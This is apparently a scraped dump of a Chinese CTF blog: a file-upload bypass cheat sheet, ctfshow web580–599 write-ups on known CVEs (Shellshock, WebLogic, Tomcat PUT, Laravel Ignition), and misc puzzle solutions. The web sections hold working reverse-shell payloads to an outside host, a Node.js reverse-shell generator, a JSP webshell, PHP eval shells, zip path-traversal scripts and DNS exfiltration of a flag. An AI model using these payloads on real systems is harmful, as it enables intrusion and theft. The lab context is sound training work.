filename=”1.a.a.a.不要忽略我的长度.a.jsp\n\n# DATA绕过\n\n没有对后缀名中的`::$DATA`进行过滤。在php+windows的情况下：如果文件名+`::$DATA`会把`::$DATA`之后的数据当成文件流处理,不会检测后缀名.且保持`::$DATA`之前的文件名。利用windows特性，可在后缀名中加`::$DATA`绕过\n\n# 常见后缀\n```\n(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\")\n```\n\n# getimagesize函数绕过\n\n当在代码中使用`getimagesize`函数来检测是不是图片，而不采取其他措施的情况下，可以在文件头加上如下内容(XBM格式图片)来绕过检测\n\n\n```text\n#define width 100;\n#define height 100;\n```\n\n# Zip Slip\n\n上传zip类型的文件后，应用程序自动进行解压，就有可能存在`zip slip`漏洞\n\n使用python生成或者010等工具手动编辑路径\n```python\nimport zipfile\n# the name of the zip file to generate\nzf = zipfile.ZipFile('out.zip', 'w')\n# the name of the malicious file that will overwrite the origial file (must exist on disk)\nfname = 'sec_test.txt'\n#destination path of the file\nzf.write(fname, '../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp')\n```\n\n>unzip命令是无法实现目录穿越的，会默认跳过../\n\n[所有已发现受Zip Slip影响的项目](https://github.com/snyk/zip-slip-vulnerability)\n\n\n# zip软连接\n\n当解压操作可以覆盖上一次解压文件时触发\n\n例如ciscn2023-unzip\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\nif (finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === 'application/zip'){\n    exec('cd /tmp && unzip -o ' . $_FILES[\"file\"][\"tmp_name\"]);\n};\n\n//only this!\n```\n\n\n`unzip`的`-o`参数表示 不必先询问用户，unzip执行后覆盖原有的文件\n\n\n**构造第一个压缩包**\n\n先构造一个指向`/var/www/html`的软连接\n```bash\nln -s /var/www/html poc\n```\n\n再保留软连接压缩\n```bash\nzip --symlinks test.zip poc\n```\n\n此时上传该`test.zip`解压出里边的文件，也就是软连接到`/var/www/html`\n\n\n**构造第二个压缩包**\n\n先创建跟第一个压缩包中目录同名的目录\n```bash\nmkdir poc\n```\n\n接着向目录中写一个shell\n```bash\necho \"<?php eval(\\$_POST['a']);?>\" > ./poc/shell.php\n```\n\n压缩这个目录\n\n```bash\nzip -r test1.zip poc\n```\n\n当我们上传第二个压缩包时，因为`poc`目录已经软连接到`/var/www/html`了，所以解压的时候会把`shell.php`放在`/var/www/html`\n\n![](/img/summary/file_upload-18.png)\n\n\n\n# tar解压目录穿越\n\ntar命令可以在打包的时候把路径也打包进去\n\n`tar cPvf test.tar ../../../../../var/www/html/upload/payload.php`\n\n\n>Linux下解压(使用的是GNU的tar)，默认情况下，tar会自动把前面的/去掉，然后在当前目录解压\n>Unix则不然，会依照绝对路径解压，对路径中的其他文件不影响，对相同的文件，覆盖。如果不存在某个目录，则创建(如果有权限)。\n>在这里 python的解压 与Unix的解压同理，会直接在指定路径下进行解压\n\n\n# phar:// & zip://\n\n`http://localhost/?url=phar://uploads/63e93ffe53f03e93bb0a0249152d243874e31c9b.zip/shell`\n`http://localhost/?url=zip:///var/www/html/upload/892e38cea0c47c744ecc60ccacc94c23.zip%23shell`\n\n\n# 利用中间件差异绕过waf\n\n来自西湖论剑的一道题目：扭转乾坤\n\n上传发现提示的`apache`不支持`Content-Type: multipart/form-data`\n\n后端为`tomcat`，`tomcat`对于包解析并不是严格按照`RFC`中的标准，对一些异常的`header`头内容也会兼容\n\n包括但不限于，修改为`Content-Type`为`multipart//form-data;`｜`大小写兼容`｜`multipart`｜`multipart/  form-data;`\n\n\n\n# 判断上传漏洞类型\n借用[c0ny1](https://gv7.me/)师傅的一个图\n![](/img/summary/file_upload-up.png)\n\n\n# 总结\n文件上传的基本姿势应该都提及了\n欢迎补充和指正！\n","tags":["总结","文件上传"],"categories":["总结"]},{"title":"【ctfshow】web入门-组件漏洞","url":"/posts/605e5ac9/","content":"\n\n>WEB580--WEB599\n\n![](/img/ctfshow/web入门/组件漏洞.png)\n\n# WEB580 #\n根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）\n这一题试了很多种payload，除了能看/etc/passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）\npayload：\n`() { :; }; /bin/bash -i >& /dev/tcp/cn1.utools.club/37634 0>&1;`\n发送如下数据包\n```\nGET /cgi-bin/index.cgi HTTP/1.1\nHost: 7f35523e-4939-43d8-8a05-f6348618a843.challenge.ctf.show:8080\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nlewiserii: () { :; }; /bin/bash -i >& /dev/tcp/cn1.utools.club/37634 0>&1;\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://7f35523e-4939-43d8-8a05-f6348618a843.challenge.ctf.show:8080/cgi-bin/victim.cgi\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: UM_distinctid=179eb628608d03-066c8283766a21-f7f1939-1bcab9-179eb62860986d\nConnection: close\n\n```\n拿到shell\n![](/img/ctfshow/web入门/web580-1.png)\n\n# WEB581 #\n具体可以参考[CVE-2017-6920](https://paper.seebug.org/334/)\npayload：\n```\ncontent=!php/object O:3:\"log\":2:{s:8:\"filename\";s:5:\"1.php\";s:7:\"content\";s:24:\"<?php eval($_POST[1]);?>\";}\n```\n\n只要带上!php/object  后面就会进行反序列化\n写入文件后访问\n![](/img/ctfshow/web入门/web581-1.png)\n\n# WEB582 #\nnodejsshell.py\n```python\nimport sys\n\nif len(sys.argv) != 3:\n    print \"Usage: %s <LHOST> <LPORT>\" % (sys.argv[0])\n    sys.exit(0)\n\nIP_ADDR = sys.argv[1]\nPORT = sys.argv[2]\n\n\ndef charencode(string):\n    \"\"\"String.CharCode\"\"\"\n    encoded = ''\n    for char in string:\n        encoded = encoded + \",\" + str(ord(char))\n    return encoded[1:]\n\nprint \"[+] LHOST = %s\" % (IP_ADDR)\nprint \"[+] LPORT = %s\" % (PORT)\nNODEJS_REV_SHELL = '''\nvar net = require('net');\nvar spawn = require('child_process').spawn;\nHOST=\"%s\";\nPORT=\"%s\";\nTIMEOUT=\"5000\";\nif (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }\nfunction c(HOST,PORT) {\n    var client = new net.Socket();\n    client.connect(PORT, HOST, function() {\n        var sh = spawn('/bin/sh',[]);\n        client.write(\"Connected!\\\\n\");\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n        sh.on('exit',function(code,signal){\n          client.end(\"Disconnected!\\\\n\");\n        });\n    });\n    client.on('error', function(e) {\n        setTimeout(c(HOST,PORT), TIMEOUT);\n    });\n}\nc(HOST,PORT);\n''' % (IP_ADDR, PORT)\n\n\n\nprint \"[+] Encoding\"\nPAYLOAD = charencode(NODEJS_REV_SHELL)\nprint \"eval(String.fromCharCode(%s))\" % (PAYLOAD)\n```\n通过nodejsshell.py生成payload\n![](/img/ctfshow/web入门/web582-1.png)\n放入`{\"username\":\"_$$ND_FUNC$$_function (){生成的payload}()\",\"password\":123}`,然后base64编码加url编码\nbp抓包，构造一个user并传入payload\n![](/img/ctfshow/web入门/web582-2.png)\n成功反弹shell\n![](/img/ctfshow/web入门/web582-3.png)\n\n# WEB583 #\nCVE-2016-10033\n在github上找到了[exp](https://github.com/opsxcq/exploit-CVE-2016-10033)\n直接打就行了\n![](/img/ctfshow/web入门/web583-1.png)\n\n但是这里有个地方要注意\n现在（6.17）github上的exp是打不通的\n我把这个和以前在github上下的版本用beyond比对了一下\n！ 竟然不一样，如果你用官网的打不通可以试试我这个[版本](https://pan.baidu.com/s/1PHYAEyRyubLVZw8cc-iscg),提取码是f3rw\n![](/img/ctfshow/web入门/web583-2.png)\n\n\n# WEB584 #\n\n生成数字exp(将echo后的内容替换成你自己的反弹一句话)\n```python\npayload = b'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9jbjEudXRvb2xzLmNsdWIvNDUyMTQgMD4mMQ==}|{base64,-d}|{bash,-i}'\nbytecode = ','.join(str(i) for i in list(payload))\nprint(bytecode)\n```\n\npayload\n```\n[{ \"op\": \"replace\", \"path\": \"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{生成的数字}))/lastname\", \"value\": \"ctfshow\" }]\n```\n首先post /api/people新建一个用户,获取到id\n![](/img/ctfshow/web入门/web584-1.png)\n\n然后通过PATCH /api/people/1，可以rce反弹shell\n**注意Content-Type的格式**\n\n![](/img/ctfshow/web入门/web584-2.png)\n![](/img/ctfshow/web入门/web584-3.png)\n\n# WEB585 #\nTomcat PUT方法任意写文件漏洞（CVE-2017-12615）\n直接抓包传即可，但是要注意tomcat对文件后缀有一定验证，（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用/）来绕过限制。\n![](/img/ctfshow/web入门/web585-1.png)\n\n拿到shell\n![](/img/ctfshow/web入门/web585-2.png)\n\n\njsp小马（pwd=023）\n```jsp\n<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%>\n<%!public static String excuteCmd(String c)\n{\n    StringBuilder line = new StringBuilder();\ntry\n{\n    Process pro = Runtime.getRuntime().exec(c);\n    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));\n    String temp = null;\n    while ((temp = buf.readLine()) != null)\n    {\n        line.append(temp+\"\\\\n\");\n    }\n    buf.close();\n}\ncatch (Exception e)\n{\n    line.append(e.getMessage());\n}\nreturn line.toString();\n}\n%>\n<%\nif(\"023\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\")))\n{\n    out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\"))+\"</pre>\");\n}\nelse\n{\n    out.println(\":-)\");\n}\n%>\n```\n\n# WEB586 #\nwordpress环境，首先尝试弱口令，进不去，只好创建一个用户进行测试\n发现里面有一篇文章介绍了这个插件漏洞\n使用百度，发现对于下面这个地址的id参数（post）存在sql注入，因为没有过滤直接带入了sql语句，所以造成了sql注入\nIP/wp-admin/admin-ajax.php?action=populate_download_edit_form\n\n我用sqlmap跑出来了，也可以手注（使用load_file读文件）\n![](/img/ctfshow/web入门/web586-1.png)\n![](/img/ctfshow/web入门/web586-2.png)\n\n# WEB587 #\nWeblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）\n漏洞使用了XMLDecoder来解析用户传入的XML数据，但在在解析的过程中出现反序列化漏洞，导致可执行任意命令。\n\n发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：\n![](/img/ctfshow/web入门/web587-1.png)\n![](/img/ctfshow/web入门/web587-2.png)\nPOC\n```\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: UM_distinctid=179eb628608d03-066c8283766a21-f7f1939-1bcab9-179eb62860986d\nConnection: close\nContent-Type: text/xml\nContent-Length: 641\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soapenv:Header>\n<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n<java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n<void class=\"java.lang.ProcessBuilder\">\n<array class=\"java.lang.String\" length=\"3\">\n<void index=\"0\">\n<string>/bin/bash</string>\n</void>\n<void index=\"1\">\n<string>-c</string>\n</void>\n<void index=\"2\">\n<string>bash -i &gt;&amp; /dev/tcp/cn1.utools.club/45214 0&gt;&amp;1</string>\n</void>\n</array>\n<void method=\"start\"/></void>\n</java>\n</work:WorkContext>\n</soapenv:Header>\n<soapenv:Body/>\n</soapenv:Envelope>\n```\n\n# WEB588 #\n吐槽一下：这一题的环境生成的好慢，我还以为环境坏了\n\nWeblogic 任意文件上传漏洞（CVE-2018-2894）\n利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。\n\n访问IP/ws_utc/config.do，如果进入时不是设置页面而是登陆页面可以刷新一下多试几次\n\n设置Work Home Dir为`/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。\n\n然后点击安全 -> 增加，然后上传webshell并找到这个文件的时间戳（可以抓包或F12查看）：\n![](/img/ctfshow/web入门/web588-1.png)\n\n然后访问IP/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell(flag在环境变量里)：\n![](/img/ctfshow/web入门/web588-2.png)\n\n# WEB589 #\nActiveMQ任意文件写入漏洞（CVE-2016-3088）\n\n首先访问IP/admin/test/systemProperties.jsp，查看ActiveMQ的绝对路径(账号密码为admin弱口令)：\n![](/img/ctfshow/web入门/web589-1.png)\n\n然后PUT方法上传webshell：\n上传成功后可以访问看一下，发现代码直接显示了，那么就表示没有解析，需要换个目录\n![](/img/ctfshow/web入门/web589-2.png)\n\n使用MOVE方法移动到web目录下的api文件夹（/opt/activemq/webapps/api/s.jsp）中：\n![](/img/ctfshow/web入门/web589-3.png)\n![](/img/ctfshow/web入门/web589-4.png)\n\n\n# WEB590 #\nApereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。\n\n使用[Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack/releases)来生成POC\n![](/img/ctfshow/web入门/web590-1.png)\n然后我们登录CAS并抓包，将Body中的execution值替换成上面生成的Payload发送\n![](/img/ctfshow/web入门/web590-2.png)\n![](/img/ctfshow/web入门/web590-3.png)\n\n# WEB591 #\n591后面都是福利题了，嘿嘿\nApache HTTPD 换行解析漏洞（CVE-2017-15715）\n在1.php后面插入一个\\x0A（注意，不能是\\x0D\\x0A，只能是一个\\x0A）\n![](/img/ctfshow/web入门/web591-1.png)\n访问刚才上传的/1.php%0a，发现能够成功解析\n![](/img/ctfshow/web入门/web591-2.png)\n\n\n# WEB592 #\nApache HTTPD 多后缀解析漏洞\n\n上传的文件中只要包含.php都能被解析\n![](/img/ctfshow/web入门/web592-1.png)\n\n![](/img/ctfshow/web入门/web592-2.png)\n\n# WEB593 #\nApache SSI 远程命令执行漏洞\n在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用`<!--#exec cmd=\"id\" -->`语法执行任意命令。\n\n上传一个shtml文件\n![](/img/ctfshow/web入门/web593-1.png)\n访问生成的文件\n![](/img/ctfshow/web入门/web593-2.png)\n\n\n# WEB594 #\nLaravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。\n[EXP](https://github.com/SNCKER/CVE-2021-3129/blob/master/exploit.py)\n运行exp还需要php，python3，linux环境，下载[phpggc](https://github.com/ambionics/phpggc)放在同一级目录下\n使用时只需要修改exp中的URL和命令即可\n![](/img/ctfshow/web入门/web594-1.png)\n\n\n# WEB595 #\n原型为PHP官方GIT服务器近日被植入的后门。\n首先，后门程序会检测http头是否含有User-Agentt(不是User-Agent，多了一个t)。\n如果存在，判断它的值是否含有zerodium字符串，作为触发后门的“口令”。\n如果标示存在，从User-Agentt值的第8个字节起到结尾提取字符串作为代码（前8个字符为zerodium），进行编译执行，如同eval函数效果。\n抓包改报文即可执行命令：\nUser-Agentt: zerodiumsystem('ls /');\n![](/img/ctfshow/web入门/web595-1.png)\n\n\n# WEB596 #\nPython PIL 远程命令执行漏洞（GhostButt ）\nPython中处理图片的模块PIL（Pillow），因为其内部调用了GhostScript而受到GhostButt漏洞（CVE-2017-8291）的影响，造成远程命令执行漏洞。\n\n可以看到有一个上传页面。正常功能是我们上传一个PNG文件，后端调用PIL加载图片，输出长宽。但我们可以将可执行命令EPS文件后缀改成PNG进行上传，因为后端是根据文件头来判断图片类型，所以无视后缀检查。\n\n比如[poc.png](https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png)，我们上传之，即可执行touch /tmp/aaaaa。将POC中的命令改为反弹命令(bash -c \"bash -i >& /dev/tcp/ip/port 0>&1\")，即可获得shell：\n![](/img/ctfshow/web入门/web596-1.png)\n\n# WEB597 #\nRuby On Rails 路径穿越漏洞（CVE-2018-3760）\nRuby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库。\n\nSprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。\n\n直接访问IP/assets/file:%2f%2f/etc/passwd，将会报错，因为文件/etc/passwd不在允许的目录中：\n![](/img/ctfshow/web入门/web597-1.png)\n在上方的报错中随意选择一个路径利用../返回上一级，成功实现任意文件读取\n![](/img/ctfshow/web入门/web597-2.png)\n\n# WEB598 #\nRuby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）\n\n在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入`Accept: ../../../../../../../../etc/passwd{{`头来构成构造路径穿越漏洞，读取任意文件。\n\n访问/robots并抓包传入Accept\n![](/img/ctfshow/web入门/web598-1.png)\n\n\n# WEB599 #\nRuby Net::FTP 模块命令注入漏洞（CVE-2017-17405）\n这一题做的时间比较久，一直反弹不出来，最后向bit师傅学到了一个新的姿势\n\n因为这是一个FTP客户端的漏洞，所以我们需要先运行一个可以被访问到的服务端。比如使用python：\n```\n# 安装pyftpdlib\npip install pyftpdlib\n\n# 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:2121`端口\npython3 -m pyftpdlib -p 2121 -i 0.0.0.0\n```\n![](/img/ctfshow/web入门/web599-1.png)\n然后即可开始利用漏洞。发送如下数据包即可（填上你的FTP服务器的ip和端口，空格要用${IFS}代替，使用前先在[dnslog.cn](http://dnslog.cn/)创建一个子域名用来接收数据(替换下面的子域名)）：\n\n`IP/download?uri=ftp://FTPIP:FTPPORT/&file=|ping${IFS}$FLAG.qfy4pq.dnslog.cn${IFS}-c${IFS}2`\n观察ftp服务器，收到数据包\n![](/img/ctfshow/web入门/web599-2.png)\ndnslog收到数据\n![](/img/ctfshow/web入门/web599-3.png)\n","tags":["wp","ctfshow-web入门"],"categories":["wp"]},{"title":"【ctfshow】群友挑战-wp","url":"/posts/37dc4cfa/","content":"\n\n# CTFshow福利抽奖 #\n\n好家伙，打开容器就是flag，但是群主把提交的框隐藏了\n![](/img/ctfshow/群友挑战-1.png)\n\n观察URL中的数字，发现这一题的value是1089\n![](/img/ctfshow/群友挑战-2.png)\n\n打开其他任意一题，修改challenge-id的value值，提交成功\n![](/img/ctfshow/群友挑战-3.png)\n\n\n# 损坏的文件 #\n\nstegsolve一把梭，另存为png文件，flag就在图片上\n![](/img/ctfshow/群友挑战-4.png)\n\n\n# 寻找坐标 #\n\n>这张图片里面隐藏了NASA的发动机实验室坐标，你能找出来吗？\n\n>坐标请删除非字母和数字的符号，字母全部大写 flag格式为ctfshow{NASA发动机实验室坐标}\n\n直接谷歌到[坐标](https://supercodepower.com/NASA-parachute-binary)\n\n\n\n# 富婆我来了 #\n\n根据提示，在群文件下载文件\n![](/img/ctfshow/群友挑战-5.png)\n\n将附件内容与群文件内容一一对应，找到中文即可\n\n>214,1--->我\n>221,7--->也\n>233,35--->想\n>15,45--->找\n>65,67--->三\n>57,37--->十\n>115,27--->六\n>229,8--->迪\n>232,27--->的\n>101,48--->富\n>124,94--->婆\n\n\n\n# FW我来了 #\n\nnotepad++或其他编辑器打开\n\n```\n[{000214A0-0000-0000-C000-000000000046}]\nProp3=19,2\n[InternetShortcut]\nModified=63746673686f777b666c61675f69735f6c6f76657d\nIconFile=C:\\WINDOWS\\system32\\SHELL32.dll\nIconIndex=10\nIDList=\nURL=https://ctf.show/\n```\n\n将modified的值转字符串即可\n\n\n\n# 病毒我来了 #\n解压后直接用010或者strings可以看到flag就在最后，不过是16进制的，转成字符串即可\n\n\n\n\n# 我是一个复读机 #\nMD5等于自身，如md5(\\$a)==$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017\n![](/img/ctfshow/群友挑战-6.png)\n\n\n# 解题姬02 #\n很有意思的一题\n\n\n使用mumuzi解题姬脚本自动解题\n```python\nfrom mumuzi import mumuzi\n\ntaoshen=mumuzi()\nf='flag.tao6000000'\nfor i in range(60000):\n    taoshen.talk()\n    f=taoshen.solve(f)\n```\n\n![](/img/ctfshow/群友挑战-7.png)\n\n得到一个`flag.layer5999880`\n\n取出其中的rar文件，在注释中发现hint\n\n![](/img/ctfshow/群友挑战-8.png)\n\n找到文件的修改时间为`2021/10/23 7:08`\n\n往前推一个月就是`2021/09/23`\n\n在pypi上找这天的版本，有`0.1.0-0.1.4`五个版本\n\n最终在`0.1.3`版本的`taoshenyulu.py`得到flag\n\n\n\n# TH185 #\n\n一脸懵逼，完全看不懂题目，二刺螈浓度太高了\n\n\n在题目给出的wiki中爆破+猜 拿到flag（因为例子给的是`CLASSICLAGER`，那就爆破类似的字符串，得到`ASAHIMARUEFU`）\n\n\n![](/img/ctfshow/群友挑战-9.png)\n\n\n\n未完待续。。。","tags":["wp","ctfshow"],"categories":["wp"]},{"title":"【buuctf】misc-page3","url":"/posts/63027cae/","content":"\n# [HBNIS2018]caesar #\n\n凯撒加密，枚举一下得到flag\n\n>flag{flagiscaesar}\n\n\n# [SWPU2019]你有没有好好看网课? #\n\n解压得到flag2.zip和flag3.zip\nflag3.zip的注释中提示了6位数字爆破，`183792`\n得到flag.docx和影 流 之 主.mp4\n\n通过`docx`中的hint`5.20`和`7.11`发现\n`mp4`的`5.67`秒存在敲击码`..... ../... ./... ./... ../`，`7.37`秒存在字符串`dXBfdXBfdXA=`\n\n\n解密得到`wllmup_up_up`\n\nflag在解压出的图片尾部\n\n>flag{A2e_Y0u_Ok?}\n\n\n# [SUCTF2018]single dog #\n\nbinwalk分离出一个txt，`aaencode`解密得到flag\n\n>flag{happy double eleven}\n\n\n# 我吃三明治 #\n\nflag藏在两张图片的中间，base64解一下即可\n\n\n>flag{6f1797d4080b29b64da5897780463e30}\n\n\n# [ACTF新生赛2020]NTFS数据流 #\n\nntfs流隐写\n\n>flag{AAAds_nntfs_ffunn?}\n\n\n# john-in-the-middle #\n\n先将所有图片提取出来，stegsolve观察其中一张时发现flag\n\n\n>flag{J0hn_th3_Sn1ff3r}\n\n\n# 喵喵喵 #\n\n\n\n# [ACTF新生赛2020]swp #\n\nforemost分离`wget.pcapng`，得到一个伪加密的压缩包，7-zip直接解压，虽然提示失败但还是会得到一个`.flag.swp`\n\n>flag{c5558bcf-26da-4f8b-b181-b61f3850b9e5}\n\n\n# [GXYCTF2019]SXMgdGhpcyBiYXNlPw== #\n\nbase64流加密\n\n```python\n# -*- coding: utf-8 -*-\n#base64解码脚本，Python2 运行\n\nb64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\n# 2.txt为需要解码的文件\nwith open('flag.txt', 'rb') as f:\n    bin_str = ''\n    for line in f.readlines():\n        stegb64 = ''.join(line.split())\n        rowb64 =  ''.join(stegb64.decode('base64').encode('base64').split())\n        offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1]))\n        equalnum = stegb64.count('=') #no equalnum no offset\n        if equalnum:\n            bin_str += bin(offset)[2:].zfill(equalnum * 2)\n        print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组\n```\n\n>flag{fazhazhenhaoting}\n\n\n# Mysterious #\n\nshift+f12搜索字符串，定位到主要函数处\n\n![](/img/buuctf/buu-misc-page3-1.jpg)\n\n\n根据条件，要满足第四五六位是`xyz`，总体不能超过6位，`v4`被`atoi()`函数转为数字整型并且`+1`，所以第一个应该输入`122`\n\n合在一起输入`122xyz`得到flag\n\n>flag{123_Buff3r_0v3rf|0w}\n\n\n# 间谍启示录 #\n\nforemost分离iso文件，解压rar后运行flag.exe得到`机密文件.txt`\n\n\n>flag{379:7b758:g7dfe7f19:9464f:4g9231}\n\n\n# [UTCTF2020]docx #\n\n将文件后缀改为zip解压，在`media`目录下得到包含`flag`的图片\n\n>flag{unz1p_3v3ryth1ng}\n\n\n# 弱口令 #\n\n注释中有东西，`tab`转`-`，空格转`.`，摩斯解密得到`HELL0FORUM`\n\nlsb隐写，密码是`123456`\n\n![](/img/buuctf/buu-misc-page3-2.png)\n\n>flag{jsy09-wytg5-wius8}\n\n\n# [RoarCTF2019]黄金6年 #\n\n\n某些书上有二维码，扫码拼接后得到`iwantplayctf`\n\nmp4文件结尾得到一串base64字符串，解码后得到一个rar文件\n\n用二维码中的密码解压得到flag\n\n>flag{CTF-from-RuMen-to-RuYuan}\n\n# 小易的U盘 #\n\n\nforemost解压后得到一个压缩包\n查看`autorun.inf`文件，发现指向了`autoflag - 副本 (32)`\nida打开就是flag\n\n>flag{29a0vkrlek3eu10ue89yug9y4r0wdu10}\n\n\n# [WUSTCTF2020]alison_likes_jojo #\n\n`foremost`分离`boki.jpg`，得到一个zip\n\n爆破密码，纯数字`888866`\n\ntxt中的内容数层base64解密得到`killerqueen`\n\noutguess隐写\n`outguess -r ../jljy.jpg -t 123.txt -k killerqueen`\n\n>flag{pretty_girl_alison_likes_jojo}\n\n\n# [安洵杯 2019]吹着贝斯扫二维码 #\n\n\n\n# zip #\n\n\n下载附件，解压得到`68`个压缩包，并且每个压缩文件里都有一个`4`个字节大小的名为`data.txt`的`txt`文件，于是尝试用`crc32`碰撞还原出所有压缩包中的文件内容\n\n得到\n`z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==`\n\n\n解码后看到提示:`fix the file and get the flag`\n\n添加rar头`52 61 72 21 1A 07 00`，在注释中看到flag\n\n>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}\n\n\n# [GUET-CTF2019]zips #\n\n先纯数字爆破，得到密码`723456`\n\n伪加密得到`setup.sh`\n\n```bash\n#!/bin/bash\n#\nzip -e --password=`python -c \"print(__import__('time').time())\"` flag.zip flag\n```\n\n根据时间戳爆破密码得到`1558080832.15`\n\n\n>flag{fkjabPqnLawhvuikfhgzyffj}\n\n\n\n# 从娃娃抓起 #\n\n中文电码+五笔\n\n人工智能+也要从娃娃抓起\n\n>flag{3b4b5dccd2c008fe7e2664bd1bc19292}\n\n\n\n# [DDCTF2018](╯°□°）╯︵ ┻━┻ #\n\n两位一组转十进制，`-128`后转为字符串\n\n>flag{922ab9974a47cd322cf43b50610faea5}","tags":["misc","buuctf"],"categories":["wp"]},{"title":"【buuctf】misc-page2","url":"/posts/14054c38/","content":"\n\n\n# 被劫持的神秘礼物 #\n\n过滤器筛选http流量，在`index.php`的post参数中找到账号和密码\n\n![](/img/buuctf/buu-misc-page2-1.png)\n\n>flag{1d240aafe21a86afc11f38a45b541a49}\n\n# 刷新过的图片 #\n\n根据题目名，锁定F5隐写\n\n`java Extract Misc.jpg`\n\n得到一个伪加密后的压缩包\n\n>flag{96efd0a2037d06f34199e921079778ee}\n\n# snake #\n\nforemost分离出一个压缩包，解压得到`ciphey`和`key`\nkey文件中的内容base64解密得到`What is Nicki Minaj's favorite song that refers to 